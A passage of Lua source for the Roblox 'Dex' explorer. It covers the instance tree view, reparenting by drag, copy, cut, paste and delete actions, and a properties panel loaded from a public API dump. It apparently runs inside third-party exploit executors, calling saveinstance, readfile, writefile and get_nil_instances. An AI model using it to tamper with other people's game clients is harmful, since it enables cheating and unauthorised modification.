			conUp:disconnect()
			conUp2:disconnect()
			dragGhost:Destroy()
			parentHighlight:Destroy()
			function cancelReparentDrag()end
		end

		local wasSelected = Selection.Selected[object]
		if not wasSelected and Option.Selectable then
			Selection:Set({object})
		end

		conUp = mouseDrag.MouseButton1Up:connect(function()
			cancelReparentDrag()
			if dragged then
				if parentIndex then
					local parentNode = TreeList[parentIndex + scrollBar.ScrollIndex]
					if parentNode then
						parentNode.Expanded = true

						local parentObj = parentNode.Object
						local function parent(a,b)
							a.Parent = b
						end
						if Option.Selectable then
							local list = Selection.List
							for i = 1,#list do
								pcall(parent,list[i],parentObj)
							end
						else
							pcall(parent,object,parentObj)
						end
					end
				end
			else
				-- do selection click
				if wasSelected and Option.Selectable then
					Selection:Set({})
				end
			end
		end)
		conUp2 = mouseDrag.MouseButton2Down:connect(function()
			cancelReparentDrag()
		end)

		mouseDrag.Parent = GetScreen(listFrame)
	end

	local entryTemplate = Create('ImageButton',{
		Name = "Entry";
		Transparency = 1;
		AutoButtonColor = false;
		Position = UDim2.new(0,0,0,0);
		Size = UDim2.new(1,0,0,ENTRY_SIZE);
		Create('Frame',{
			Name = "IndentFrame";
			BackgroundTransparency = 1;
			BackgroundColor3 = GuiColor.Selected;
			BorderColor3 = GuiColor.BorderSelected;
			Position = UDim2.new(0,0,0,0);
			Size = UDim2.new(1,0,1,0);
			Create(Icon('ImageButton',0, true),{
				Name = "Expand";
				AutoButtonColor = false;
				Position = UDim2.new(0,-GUI_SIZE,0.5,-GUI_SIZE/2);
				Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
			});
			Create(Icon(nil,0),{
				Name = "ExplorerIcon";
				Position = UDim2.new(0,2+ENTRY_PADDING,0.5,-GUI_SIZE/2);
				Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
			});
			Create('TextLabel',{
				Name = "EntryText";
				BackgroundTransparency = 1;
				TextColor3 = GuiColor.Text;
				TextXAlignment = 'Left';
				TextYAlignment = 'Center';
				Font = FONT;
				FontSize = FONT_SIZE;
				Text = "";
				Position = UDim2.new(0,2+ENTRY_SIZE+4,0,0);
				Size = UDim2.new(1,-2,1,0);
			});
		});
	})

	function scrollBar.UpdateCallback(self)
		for i = 1,self.VisibleSpace do
			local node = TreeList[i + self.ScrollIndex]
			if node then
				local entry = listEntries[i]
				if not entry then
					entry = Create(entryTemplate:Clone(),{
						Position = UDim2.new(0,2,0,ENTRY_BOUND*(i-1)+2);
						Size = UDim2.new(0,nodeWidth,0,ENTRY_SIZE);
						ZIndex = listFrame.ZIndex;
					})
					listEntries[i] = entry

					local expand = entry.IndentFrame.Expand
					expand.MouseEnter:connect(function()
						local node = TreeList[i + self.ScrollIndex]
						if #node > 0 then
							if node.Expanded then
                                local earrow = Icon(expand,NODE_EXPANDED)
                                TweenService:Create(earrow.IconMap, TweenInfo.new(0.1), {ImageColor3 = Color3.fromRGB(197, 28, 70)}):Play()
							else
                                local earrow = Icon(expand,NODE_COLLAPSED)
                                TweenService:Create(earrow.IconMap, TweenInfo.new(0.1), {ImageColor3 = Color3.fromRGB(197, 28, 70)}):Play()
							end
						end
					end)
					expand.MouseLeave:connect(function()
						local node = TreeList[i + self.ScrollIndex]
						if #node > 0 then
							if node.Expanded then
                                local earrow = Icon(expand,NODE_EXPANDED)
                                TweenService:Create(earrow.IconMap, TweenInfo.new(0.1), {ImageColor3 = Color3.fromRGB(255,255,255)}):Play()
							else
                                local earrow = Icon(expand,NODE_COLLAPSED)
                                TweenService:Create(earrow.IconMap, TweenInfo.new(0.1), {ImageColor3 = Color3.fromRGB(255,255,255)}):Play()
							end
						end
					end)
					expand.MouseButton1Down:connect(function()
						local node = TreeList[i + self.ScrollIndex]
						if #node > 0 then
							node.Expanded = not node.Expanded
							if node.Object == explorerPanel.Parent and node.Expanded then
								CreateCaution("Warning","Please be careful when editing instances inside here, this is like the System32 of Dex and modifying objects here can break Dex.")
							end
							-- use raw update so the list updates instantly
							rawUpdateList()
						end
					end)

					entry.MouseButton1Down:connect(function(x,y)
						local node = TreeList[i + self.ScrollIndex]
						DestroyRightClick()
						if GetAwaitRemote:Invoke() then
							bindSetAwaiting:Fire(node.Object)
							return
						end
						
						if not HoldingShift then
							lastSelectedNode = i + self.ScrollIndex
						end
						
						if HoldingShift and not filteringWorkspace() then
							if lastSelectedNode then
								if i + self.ScrollIndex - lastSelectedNode > 0 then
									Selection:StopUpdates()
									for i2 = 1, i + self.ScrollIndex - lastSelectedNode do
										local newNode = TreeList[lastSelectedNode + i2]
										if newNode then
											Selection:Add(newNode.Object)
										end
									end
									Selection:ResumeUpdates()
								else
									Selection:StopUpdates()
									for i2 = i + self.ScrollIndex - lastSelectedNode, 1 do
										local newNode = TreeList[lastSelectedNode + i2]
										if newNode then
											Selection:Add(newNode.Object)
										end
									end
									Selection:ResumeUpdates()
								end
							end
							return
						end
						
						if HoldingCtrl then
							if Selection.Selected[node.Object] then
								Selection:Remove(node.Object)
							else
								Selection:Add(node.Object)
							end
							return
						end
						if Option.Modifiable then
							local pos = Vector2.new(x,y)
							dragReparent(node.Object,entry:Clone(),pos,entry.AbsolutePosition-pos)
						elseif Option.Selectable then
							if Selection.Selected[node.Object] then
								Selection:Set({})
							else
								Selection:Set({node.Object})
							end
							dragSelect(i+self.ScrollIndex,true,'MouseButton1Up')
						end
					end)

					entry.MouseButton2Down:connect(function()
						if not Option.Selectable then return end
						
						DestroyRightClick()
						
						curSelect = entry
						
						local node = TreeList[i + self.ScrollIndex]
						
						if GetAwaitRemote:Invoke() then
							bindSetAwaiting:Fire(node.Object)
							return
						end
						
						if not Selection.Selected[node.Object] then
							Selection:Set({node.Object})
						end
					end)
					
					
					entry.MouseButton2Up:connect(function()
						if not Option.Selectable then return end
						
						local node = TreeList[i + self.ScrollIndex]
						
						if checkMouseInGui(curSelect) then
							rightClickMenu(node.Object)
						end
					end)

					entry.Parent = listFrame
				end

				entry.Visible = true

				local object = node.Object

				-- update expand icon
				if #node == 0 then
					entry.IndentFrame.Expand.Visible = false
				elseif node.Expanded then
					Icon(entry.IndentFrame.Expand,NODE_EXPANDED)
					entry.IndentFrame.Expand.Visible = true
				else
					Icon(entry.IndentFrame.Expand,NODE_COLLAPSED)
					entry.IndentFrame.Expand.Visible = true
				end

				-- update explorer icon
				Icon(entry.IndentFrame.ExplorerIcon,ExplorerIndex[object.ClassName] or 0)

				-- update indentation
				local w = (node.Depth)*(2+ENTRY_PADDING+GUI_SIZE)
				entry.IndentFrame.Position = UDim2.new(0,w,0,0)
				entry.IndentFrame.Size = UDim2.new(1,-w,1,0)

				-- update name change detection
				if nameConnLookup[entry] then
					nameConnLookup[entry]:disconnect()
				end
				local text = entry.IndentFrame.EntryText
				text.Text = object.Name
				nameConnLookup[entry] = node.Object.Changed:connect(function(p)
					if p == 'Name' then
						text.Text = object.Name
					end
				end)

				-- update selection
				entry.IndentFrame.Transparency = node.Selected and 0 or 1
				text.TextColor3 = GuiColor[node.Selected and 'TextSelected' or 'Text']

				entry.Size = UDim2.new(0,nodeWidth,0,ENTRY_SIZE)
			elseif listEntries[i] then
				listEntries[i].Visible = false
			end
		end
		for i = self.VisibleSpace+1,self.TotalSpace do
			local entry = listEntries[i]
			if entry then
				listEntries[i] = nil
				entry:Destroy()
			end
		end
	end

	function scrollBarH.UpdateCallback(self)
		for i = 1,scrollBar.VisibleSpace do
			local node = TreeList[i + scrollBar.ScrollIndex]
			if node then
				local entry = listEntries[i]
				if entry then
					entry.Position = UDim2.new(0,2 - scrollBarH.ScrollIndex,0,ENTRY_BOUND*(i-1)+2)
				end
			end
		end
	end

	Connect(listFrame.Changed,function(p)
		if p == 'AbsoluteSize' then
			rawUpdateSize()
		end
	end)

	local wheelAmount = 6
	
	explorerPanel.MouseWheelForward:connect(function()
		if input ~= nil and input.down ~= nil and input.down.leftshift then
			if scrollBarH.VisibleSpace - 1 > wheelAmount then
				scrollBarH:ScrollTo(scrollBarH.ScrollIndex - wheelAmount)
			else
				scrollBarH:ScrollTo(scrollBarH.ScrollIndex - scrollBarH.VisibleSpace)
			end
		else
			if scrollBar.VisibleSpace - 1 > wheelAmount then
				scrollBar:ScrollTo(scrollBar.ScrollIndex - wheelAmount)
			else
				scrollBar:ScrollTo(scrollBar.ScrollIndex - scrollBar.VisibleSpace)
			end
		end
	end)
	explorerPanel.MouseWheelBackward:connect(function()
		if input ~= nil and input.down ~= nil and input.down.leftshift then
			if scrollBarH.VisibleSpace - 1 > wheelAmount then
				scrollBarH:ScrollTo(scrollBarH.ScrollIndex + wheelAmount)
			else
				scrollBarH:ScrollTo(scrollBarH.ScrollIndex + scrollBarH.VisibleSpace)
			end
		else
			if scrollBar.VisibleSpace - 1 > wheelAmount then
				scrollBar:ScrollTo(scrollBar.ScrollIndex + wheelAmount)
			else
				scrollBar:ScrollTo(scrollBar.ScrollIndex + scrollBar.VisibleSpace)
			end
		end
	end)
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Object detection

-- Inserts `v` into `t` at `i`. Also sets `Index` field in `v`.
local function insert(t,i,v)
	for n = #t,i,-1 do
		local v = t[n]
		v.Index = n+1
		t[n+1] = v
	end
	v.Index = i
	t[i] = v
end

-- Removes `i` from `t`. Also sets `Index` field in removed value.
local function remove(t,i)
	local v = t[i]
	for n = i+1,#t do
		local v = t[n]
		v.Index = n-1
		t[n-1] = v
	end
	t[#t] = nil
	v.Index = 0
	return v
end

-- Returns how deep `o` is in the tree.
local function depth(o)
	local d = -1
	while o do
		o = o.Parent
		d = d + 1
	end
	return d
end


local connLookup = {}

-- Returns whether a node would be present in the tree list
local function nodeIsVisible(node)
	local visible = true
	node = node.Parent
	while node and visible do
		visible = visible and node.Expanded
		node = node.Parent
	end
	return visible
end

-- Removes an object's tree node. Called when the object stops existing in the
-- game tree.
local function removeObject(object)
	local objectNode = NodeLookup[object]
	if not objectNode then
		return
	end

	local visible = nodeIsVisible(objectNode)

	Selection:Remove(object,true)

	local parent = objectNode.Parent
	remove(parent,objectNode.Index)
	NodeLookup[object] = nil
	connLookup[object]:disconnect()
	connLookup[object] = nil

	if visible then
		updateList()
	elseif nodeIsVisible(parent) then
		updateScroll()
	end
end

-- Moves a tree node to a new parent. Called when an existing object's parent
-- changes.
local function moveObject(object,parent)
	local objectNode = NodeLookup[object]
	if not objectNode then
		return
	end

	local parentNode = NodeLookup[parent]
	if not parentNode then
		return
	end

	local visible = nodeIsVisible(objectNode)

	remove(objectNode.Parent,objectNode.Index)
	objectNode.Parent = parentNode

	objectNode.Depth = depth(object)
	local function r(node,d)
		for i = 1,#node do
			node[i].Depth = d
			r(node[i],d+1)
		end
	end
	r(objectNode,objectNode.Depth+1)

	insert(parentNode,#parentNode+1,objectNode)

	if visible or nodeIsVisible(objectNode) then
		updateList()
	elseif nodeIsVisible(objectNode.Parent) then
		updateScroll()
	end
end

-- ScriptContext['/Libraries/LibraryRegistration/LibraryRegistration']
-- This RobloxLocked object lets me index its properties for some reason

local function check(object)
	return object.AncestryChanged
end

-- Creates a new tree node from an object. Called when an object starts
-- existing in the game tree.
local function addObject(object,noupdate)
	if script then
		-- protect against naughty RobloxLocked objects
		local s = pcall(check,object)
		if not s then
			return
		end
	end

	local parentNode = NodeLookup[object.Parent]
	if not parentNode then
		return
	end

	local objectNode = {
		Object = object;
		Parent = parentNode;
		Index = 0;
		Expanded = false;
		Selected = false;
		Depth = depth(object);
	}

	connLookup[object] = Connect(object.AncestryChanged,function(c,p)
		if c == object then
			if p == nil then
				removeObject(c)
			else
				moveObject(c,p)
			end
		end
	end)

	NodeLookup[object] = objectNode
	insert(parentNode,#parentNode+1,objectNode)

	if not noupdate then
		if nodeIsVisible(objectNode) then
			updateList()
		elseif nodeIsVisible(objectNode.Parent) then
			updateScroll()
		end
	end
end

local function makeObject(obj,par)
	local newObject = Instance.new(obj.ClassName)
	for i,v in pairs(obj.Properties) do
		ypcall(function()
			local newProp
			newProp = ToPropValue(v.Value,v.Type)
			newObject[v.Name] = newProp
		end)
	end
	newObject.Parent = par
end

local function writeObject(obj)
	local newObject = {ClassName = obj.ClassName, Properties = {}}
	for i,v in pairs(RbxApi.GetProperties(obj.className)) do
		if v["Name"] ~= "Parent" then
			table.insert(newObject.Properties,{Name = v["Name"], Type = v["ValueType"], Value = tostring(obj[v["Name"]])})
		end
	end
	return newObject
end

local function buildDexStorage()
	--[[local localDexStorage
	
	local success,err = ypcall(function()
		localDexStorage = game:GetObjects("rbxasset://DexStorage.rbxm")
	end)
	
	if success and localDexStorage then
		for i,v in pairs(localDexStorage:GetChildren()) do
			ypcall(function()
				v.Parent = DexStorageMain
			end)
		end
	end]]
	
	updateDexStorageListeners()
	--[[
	local localDexStorage = readfile(getelysianpath().."DexStorage.txt")--game:GetService("CookiesService"):GetCookieValue("DexStorage")
	--local success,err = pcall(function()
		if localDexStorage then
			local objTable = game:GetService("HttpService"):JSONDecode(localDexStorage)
			for i,v in pairs(objTable) do
				makeObject(v,DexStorageMain)
			end
		end
	--end)
	--]]
end

local dexStorageDebounce = false
local dexStorageListeners = {}

local function updateDexStorage()
	if dexStorageDebounce then return end
	dexStorageDebounce = true	
	
	wait()
	
	pcall(function()
		saveinstance("content//DexStorage.rbxm",DexStorageMain)
	end)
	
	updateDexStorageListeners()
	
	dexStorageDebounce = false
	--[[
	local success,err = ypcall(function()
		local objs = {}
		for i,v in pairs(DexStorageMain:GetChildren()) do
			table.insert(objs,writeObject(v))
		end
		writefile(getelysianpath().."DexStorage.txt",game:GetService("HttpService"):JSONEncode(objs))
		--game:GetService("CookiesService"):SetCookieValue("DexStorage",game:GetService("HttpService"):JSONEncode(objs))
	end)
	if err then
		CreateCaution("DexStorage Save Fail!","DexStorage broke! If you see this message, report to Raspberry Pi!")
	end
	print("hi")
	--]]
end

function updateDexStorageListeners()
	for i,v in pairs(dexStorageListeners) do
		v:Disconnect()
	end
	dexStorageListeners = {}
	for i,v in pairs(DexStorageMain:GetChildren()) do
		pcall(function()
			local ev = v.Changed:connect(updateDexStorage)
			table.insert(dexStorageListeners,ev)
		end)
	end
end

do
	NodeLookup[workspace.Parent] = {
		Object = workspace.Parent;
		Parent = nil;
		Index = 0;
		Expanded = true;
	}
	
	if DexStorageEnabled then
		NodeLookup[DexStorage] = {
			Object = DexStorage;
			Parent = nil;
			Index = 0;
			Expanded = true;
		}
	end
	
	if RunningScriptsStorageEnabled then
		NodeLookup[RunningScriptsStorage] = {
			Object = RunningScriptsStorage;
			Parent = nil;
			Index = 0;
			Expanded = true;
		}
	end

	if UpvalueStorageEnabled then
		NodeLookup[UpvalueStorage] = {
			Object = UpvalueStorage;
			Parent = nil;
			Index = 0;
			Expanded = true;
		}
	end

	Connect(game.DescendantAdded,addObject)
	Connect(game.DescendantRemoving,removeObject)
	
	if DexStorageEnabled then
		--[[
		if readfile(getelysianpath().."DexStorage.txt") == nil then
			writefile(getelysianpath().."DexStorage.txt","")
		end
		--]]
		
		buildDexStorage()
	
		Connect(DexStorage.DescendantAdded,addObject)
		Connect(DexStorage.DescendantRemoving,removeObject)
	
		Connect(DexStorage.DescendantAdded,updateDexStorage)
		Connect(DexStorage.DescendantRemoving,updateDexStorage)
	end

	if UpvalueStorageEnabled then
		Connect(UpvalueStorageVariables.DescendantAdded,addObject)
		Connect(UpvalueStorageVariables.DescendantRemoving,removeObject)
	
		Connect(UpvalueStorageFunctions.DescendantAdded,addObject)
		Connect(UpvalueStorageFunctions.DescendantRemoving,removeObject)
	end
	
	if RunningScriptsStorageEnabled then
		Connect(RunningScriptsStorage.DescendantAdded,addObject)
		Connect(RunningScriptsStorage.DescendantRemoving,removeObject)		
		
		--[[ local currentTable = get_nil_instances()
		
		spawn(function()
			while true do
				if #currentTable ~= #get_nil_instances() then
					currentTable = get_nil_instances()
					--RunningScriptsStorageMain:ClearAllChildren()
					for i,v in pairs(get_nil_instances() do
						if v ~= RunningScriptsStorage and v ~= DexStorage and v ~= UpvalueStorage then
							pcall(function()
								v.Parent = RunningScriptsStorageMain
							end)
						end
					end
				end
				wait(60)
			end
		end)]]
	end

	local function get(o)
		return o:GetDescendants()
	end

	local function r(o)
		local s,children = pcall(get,o)
		if s then
			for i = 1,#children do
				addObject(children[i],true)
				-- r(children[i])
			end
		end
	end

	r(workspace.Parent)

	if DexStorageEnabled then
		r(DexStorage)
	end
	if RunningScriptsStorageEnabled then
		r(RunningScriptsStorage)
	end
	if UpvalueStorageEnabled then
		r(UpvalueStorage)
	end

	scrollBar.VisibleSpace = math.ceil(listFrame.AbsoluteSize.y/ENTRY_BOUND)
	updateList()
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Actions

local actionButtons do
	actionButtons = {}

	local totalActions = 1
	local currentActions = totalActions
	local function makeButton(icon,over,name,vis,cond)
		local buttonEnabled = false
		
		local button = Create(Icon('ImageButton',icon),{
			Name = name .. "Button";
			Visible = Option.Modifiable and Option.Selectable;
			Position = UDim2.new(1,-(GUI_SIZE+2)*currentActions+2,0.25,-GUI_SIZE/2);
			Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
			Parent = headerFrame;
		})

		local tipText = Create('TextLabel',{
			Name = name .. "Text";
			Text = name;
			Visible = false;
			BackgroundTransparency = 1;
			TextXAlignment = 'Right';
			Font = FONT;
			FontSize = FONT_SIZE;
			Position = UDim2.new(0,0,0,0);
			Size = UDim2.new(1,-(GUI_SIZE+2)*totalActions,1,0);
			Parent = headerFrame;
		})

		
		button.MouseEnter:connect(function()
			if buttonEnabled then
				button.BackgroundTransparency = 0.9
			end
			--Icon(button,over)
			--tipText.Visible = true
		end)
		button.MouseLeave:connect(function()
			button.BackgroundTransparency = 1
			--Icon(button,icon)
			--tipText.Visible = false
		end)

		currentActions = currentActions + 1
		actionButtons[#actionButtons+1] = {Obj = button,Cond = cond}
		QuickButtons[#actionButtons+1] = {Obj = button,Cond = cond, Toggle = function(on)
			if on then
				buttonEnabled = true
				Icon(button,over)
			else
				buttonEnabled = false
				Icon(button,icon)
			end
		end}
		return button
	end

	--local clipboard = {}
	local function delete(o)
		o.Parent = nil
	end
	
	makeButton(ACTION_EDITQUICKACCESS,ACTION_EDITQUICKACCESS,"Options",true,function()return true end).MouseButton1Click:connect(function()
		
	end)
	

	-- DELETE
	makeButton(ACTION_DELETE,ACTION_DELETE_OVER,"Delete",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
		if not Option.Modifiable then return end
		local list = Selection:Get()
		for i = 1,#list do
			pcall(delete,list[i])
		end
		Selection:Set({})
	end)
	
	-- PASTE
	makeButton(ACTION_PASTE,ACTION_PASTE_OVER,"Paste",true,function() return #Selection:Get() > 0 and #clipboard > 0 end).MouseButton1Click:connect(function()
		if not Option.Modifiable then return end
		local parent = Selection.List[1] or workspace
		for i = 1,#clipboard do
			clipboard[i]:Clone().Parent = parent
		end
	end)
	
	-- COPY
	makeButton(ACTION_COPY,ACTION_COPY_OVER,"Copy",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
		if not Option.Modifiable then return end
		clipboard = {}
		local list = Selection.List
		for i = 1,#list do
			table.insert(clipboard,list[i]:Clone())
		end
		updateActions()
	end)
	
	-- CUT
	makeButton(ACTION_CUT,ACTION_CUT_OVER,"Cut",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
		if not Option.Modifiable then return end
		clipboard = {}
		local list = Selection.List
		local cut = {}
		for i = 1,#list do
			local obj = list[i]:Clone()
			if obj then
				table.insert(clipboard,obj)
				table.insert(cut,list[i])
			end
		end
		for i = 1,#cut do
			pcall(delete,cut[i])
		end
		updateActions()
	end)
	
	-- FREEZE
	makeButton(ACTION_FREEZE,ACTION_FREEZE,"Freeze",true,function() return true end)
	
	-- ADD/REMOVE STARRED
	makeButton(ACTION_ADDSTAR,ACTION_ADDSTAR_OVER,"Star",true,function() return #Selection:Get() > 0 end)
	
	-- STARRED
	makeButton(ACTION_STARRED,ACTION_STARRED,"Starred",true,function() return true end)


	-- SORT
	-- local actionSort = makeButton(ACTION_SORT,ACTION_SORT_OVER,"Sort")
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Option Bindables

do
	local optionCallback = {
		Modifiable = function(value)
			for i = 1,#actionButtons do
				actionButtons[i].Obj.Visible = value and Option.Selectable
			end
			cancelReparentDrag()
		end;
		Selectable = function(value)
			for i = 1,#actionButtons do
				actionButtons[i].Obj.Visible = value and Option.Modifiable
			end
			cancelSelectDrag()
			Selection:Set({})
		end;
	}

	local bindSetOption = explorerPanel:FindFirstChild("SetOption")
	if not bindSetOption then
		bindSetOption = Create('BindableFunction',{Name = "SetOption"})
		bindSetOption.Parent = explorerPanel
	end

	bindSetOption.OnInvoke = function(optionName,value)
		if optionCallback[optionName] then
			Option[optionName] = value
			optionCallback[optionName](value)
		end
	end

	local bindGetOption = explorerPanel:FindFirstChild("GetOption")
	if not bindGetOption then
		bindGetOption = Create('BindableFunction',{Name = "GetOption"})
		bindGetOption.Parent = explorerPanel
	end

	bindGetOption.OnInvoke = function(optionName)
		if optionName then
			return Option[optionName]
		else
			local options = {}
			for k,v in pairs(Option) do
				options[k] = v
			end
			return options
		end
	end
end

function SelectionVar()
	return Selection
end

Input.InputBegan:connect(function(key)
	if key.KeyCode == Enum.KeyCode.LeftControl then
		HoldingCtrl = true
	end
	if key.KeyCode == Enum.KeyCode.LeftShift then
		HoldingShift = true
	end
end)

Input.InputEnded:connect(function(key)
	if key.KeyCode == Enum.KeyCode.LeftControl then
		HoldingCtrl = false
	end
	if key.KeyCode == Enum.KeyCode.LeftShift then
		HoldingShift = false
	end
end)

while RbxApi == nil do
	RbxApi = GetApiRemote:Invoke()
	wait()
end

explorerFilter.FocusLost:connect(function()
	rawUpdateList()
end)

--[[local lastType = 0

explorerFilter.Changed:connect(function(prop)
	if prop == "Text" then
		if tick() - lastType > 1 then
			rawUpdateList()
		end
		lastType = tick()
	end
end)]]

CurrentInsertObjectWindow = CreateInsertObjectMenu(
	GetClasses(),
	"",
	false,
	function(option)
		CurrentInsertObjectWindow.Visible = false
		local list = SelectionVar():Get()
		for i = 1,#list do
			pcall(function() Instance.new(option,list[i]) end)
		end
		DestroyRightClick()
	end
)
end)
spawn(function()
	--[[
	
Change log:

09/18
	Fixed checkbox mouseover sprite
	Encapsulated checkbox creation into separate method
	Fixed another checkbox issue

09/15
	Invalid input is ignored instead of setting to default of that data type
	Consolidated control methods and simplified them
	All input goes through ToValue method
	Fixed position of BrickColor palette
	Made DropDown appear above row if it would otherwise exceed the page height
	Cleaned up stylesheets

09/14
	Made properties window scroll when mouse wheel scrolled
	Object/Instance and Color3 data types handled properly
	Multiple BrickColor controls interfering with each other fixed
	Added support for Content data type
	
--]]

wait(0.2)

-- Services
local Teams = game:GetService("Teams")
local Workspace = game:GetService("Workspace")
local Debris = game:GetService("Debris")
local ContentProvider = game:GetService("ContentProvider")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Functions
function httpGet(url)
	return game:HttpGet(url,true)
end

-- RbxApi Stuff
local maxChunkSize = 100 * 1000
local ApiJson
if script:FindFirstChild("RawApiJson") then
	ApiJson = script.RawApiJson
else
	ApiJson = ""
end



function getCurrentApiJson()
	return game:HttpGet("https://anaminus.github.io/rbx/json/api/latest.json", true);
end

function splitStringIntoChunks(jsonStr)
	-- Splits up a string into a table with a given size
	local t = {}
	for i = 1, math.ceil(string.len(jsonStr)/maxChunkSize) do
		local str = jsonStr:sub((i-1)*maxChunkSize+1, i*maxChunkSize)
		table.insert(t, str)
	end
	return t
end

local jsonToParse = getCurrentApiJson()
local apiChunks = splitStringIntoChunks(jsonToParse)

function getRbxApi()
--[[
	Api.Classes
	Api.Enums
	Api.GetProperties(className)
	Api.IsEnum(valueType)
--]]

-- Services
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Remotes
--local Remotes = ReplicatedStorage:WaitForChild("OnlineStudio"):WaitForChild("Remotes")
--local GetApiJsonFunction = Remotes:WaitForChild("GetApiJson")

-- Functions
local JsonDecode = function(s) return HttpService:JSONDecode(s) end

local function GetApiRemoteFunction(index)
	if (apiChunks[index]) then 
		return apiChunks[index], #apiChunks
	else
		return nil
	end
end

local function getApiJson()
	local apiTable = {}
	local firstPage, pageCount = GetApiRemoteFunction(1)
	table.insert(apiTable, firstPage)
	for i = 2, pageCount do
		--print("Fetching API page # " .. tostring(i))
		local result = GetApiRemoteFunction(i)
		table.insert(apiTable, result)
	end
	return table.concat(apiTable)
end

local json = getApiJson()
local apiDump =  JsonDecode(json)

local Classes = {}
local Enums = {}

local function sortAlphabetic(t, property)
	table.sort(t, 
		function(x,y) return x[property] < y[property]
	end)
end

local function isEnum(name)
	return Enums[name] ~= nil
end

local function getProperties(className)
	local class = Classes[className]
	local properties = {}
	
	if not class then return properties end
	
	while class do
		for _,property in pairs(class.Properties) do
			table.insert(properties, property)
		end
		class = Classes[class.Superclass]
	end
	
	sortAlphabetic(properties, "Name")

	return properties
end

for _,item in pairs(apiDump) do
	local itemType = item.type
-- Classes --
	if (itemType == 'Class') then
		Classes[item.Name] = item
		item.Properties = {}
		item.Functions = {}
		item.YieldFunctions = {}
		item.Events = {}
		item.Callbacks = {}
-- Members --
	elseif (itemType == 'Property') then
		table.insert(Classes[item.Class].Properties, item)
	elseif (itemType == 'Function') then
		table.insert(Classes[item.Class].Functions, item)
	elseif (itemType == 'YieldFunction') then
		table.insert(Classes[item.Class].YieldFunctions, item)
	elseif (itemType == 'Event') then
		table.insert(Classes[item.Class].Events, item)
	elseif (itemType == 'Callback') then
		table.insert(Classes[item.Class].Callbacks, item)
-- Enums --
	elseif (itemType == 'Enum') then
		Enums[item.Name] = item
		item.EnumItems = {}
	elseif (itemType == 'EnumItem') then
		Enums[item.Enum].EnumItems[item.Name] = item
	end
end

return {
	Classes = Classes;
	Enums = Enums;
	GetProperties = getProperties;
	IsEnum = isEnum;
}
end

-- Modules
local Permissions = {CanEdit = true}
local RbxApi = getRbxApi()

--[[
	RbxApi.Classes
	RbxApi.Enums
	RbxApi.GetProperties(className)
	RbxApi.IsEnum(valueType)
--]]

-- Styles

local function CreateColor3(r, g, b) return Color3.new(r/255,g/255,b/255) end

local Styles = {
	Font = Enum.Font.Arial;
	Margin = 5;
	Black = CreateColor3(0,0,0);
	White = CreateColor3(32,32,32);
}

local Row = {
	Font = Styles.Font;
	FontSize = Enum.FontSize.Size14;
	TextXAlignment = Enum.TextXAlignment.Left;
	TextColor = Color3.fromRGB(244,244,244);
	TextColorOver = Color3.fromRGB(244,244,244);
	TextLockedColor = CreateColor3(230,230,230);
	Height = 24;
	BorderColor = CreateColor3(216/4,216/4,216/4);
	BackgroundColor = Styles.White;
	BackgroundColorAlternate = CreateColor3(32, 32, 32);
	BackgroundColorMouseover = CreateColor3(40, 40, 40);
	TitleMarginLeft = 15;
}

local DropDown = {
	Font = Styles.Font;
	FontSize = Enum.FontSize.Size14;
	TextColor = CreateColor3(255,255,255);
	TextColorOver = Color3.new(1, 1, 1);
	TextXAlignment = Enum.TextXAlignment.Left;
	Height = 16;
	BackColor = Styles.White;
	BackColorOver = CreateColor3(197, 28, 70); 
	BorderColor = CreateColor3(45,45,45);
	BorderSizePixel = 2;
	ArrowColor = CreateColor3(160/2,160/2,160/2);
	ArrowColorOver = Styles.Black;
}

local BrickColors = {
	BoxSize = 13;
	BorderSizePixel = 1;
	BorderColor = CreateColor3(160,160,160);
	FrameColor = CreateColor3(160,160,160);
	Size = 20;
	Padding = 4;
	ColorsPerRow = 8;
	OuterBorder = 1;
	OuterBorderColor = Styles.Black;
}

wait(1)

local Gui = D_E_X
local PropertiesFrame = Gui:WaitForChild("PropertiesFrame")
local ExplorerFrame = Gui:WaitForChild("ExplorerPanel")

local bindGetSelection = ExplorerFrame.GetSelection
local bindSelectionChanged = ExplorerFrame.SelectionChanged
local bindGetApi = PropertiesFrame.GetApi
local bindGetAwait = PropertiesFrame.GetAwaiting
local bindSetAwait = PropertiesFrame.SetAwaiting

local ContentUrl = ContentProvider.BaseUrl .. "asset/?id="

local SettingsRemote = Gui:WaitForChild("SettingsPanel"):WaitForChild("GetSetting")

local propertiesSearch = PropertiesFrame.Header.TextBox

local AwaitingObjectValue = false
local AwaitingObjectObj
local AwaitingObjectProp

function searchingProperties()
	if propertiesSearch.Text ~= "" and propertiesSearch.Text ~= "Search Properties" then
		return true
	end
	return false
end

local function GetSelection()
	local selection = bindGetSelection:Invoke()
	if #selection == 0 then
		return nil
	else
		return selection
	end 
end

-- Number

local function Round(number, decimalPlaces)
	return tonumber(string.format("%." .. (decimalPlaces or 0) .. "f", number))
end

-- Strings

local function Split(str, delimiter)
	local start = 1
	local t = {}
	while true do
		local pos = string.find (str, delimiter, start, true)
		if not pos then
			break
		end
		table.insert (t, string.sub (str, start, pos - 1))
		start = pos + string.len (delimiter)
	end
	table.insert (t, string.sub (str, start))
	return t
end

-- Data Type Handling

local function ToString(value, type)
	if type == "float" then
		return tostring(Round(value,2))
	elseif type == "Content" then
		if string.find(value,"/asset") then
			local match = string.find(value, "=") + 1
			local id = string.sub(value, match)
			return id
		else
			return tostring(value)
		end
	elseif type == "Vector2" then
		local x = value.x
		local y = value.y
		return string.format("%g, %g", x,y)
	elseif type == "Vector3" then
		local x = value.x
		local y = value.y
		local z = value.z
		return string.format("%g, %g, %g", x,y,z)
	elseif type == "Color3" then
		local r = value.r
		local g = value.g
		local b = value.b
		return string.format("%d, %d, %d", r*255,g*255,b*255)
	elseif type == "UDim2" then
		local xScale = value.X.Scale
